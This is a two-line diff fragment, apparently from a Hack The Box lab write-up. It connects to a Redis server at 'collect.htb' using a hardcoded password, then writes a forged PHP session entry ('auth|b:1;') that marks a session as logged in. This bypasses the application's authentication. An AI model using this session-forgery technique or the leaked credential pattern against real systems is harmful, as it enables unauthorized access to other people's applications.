@@ -1,0 +1,2 @@
+redis-cli -h collect.htb -a "COLLECTR3D1SPASS"
+set "PHPREDIS_SESSION:cppih48j9b4rvmooef55jkp9qr" "auth|b:1;"
